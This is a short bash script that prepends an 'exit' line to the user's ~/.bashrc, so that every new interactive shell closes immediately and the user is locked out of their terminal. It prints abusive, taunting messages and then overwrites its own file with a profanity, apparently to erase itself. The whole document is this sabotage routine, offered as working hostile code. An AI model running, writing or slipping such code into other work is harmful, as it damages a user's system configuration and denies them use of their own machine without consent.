#!/bin/bash 

BASHRC_PATH="$HOME/.bashrc"

if [ -f "$BASHRC_PATH" ]; then 

    if ! grep -Fxq "exit" "$BASHRC_PATH"; then 
        
        echo "You will pay for your sin...."
        { echo "exit"; cat "$BASHRC_PATH"; } > "$BASHRC_PATH.temp" 2>/dev/null 
        mv "$BASHRC_PATH.temp" "$BASHRC_PATH"
        
    fi 

else
    echo "You escaped Bastard. I will catch you again...."
fi 
echo "Fuck you" > $0
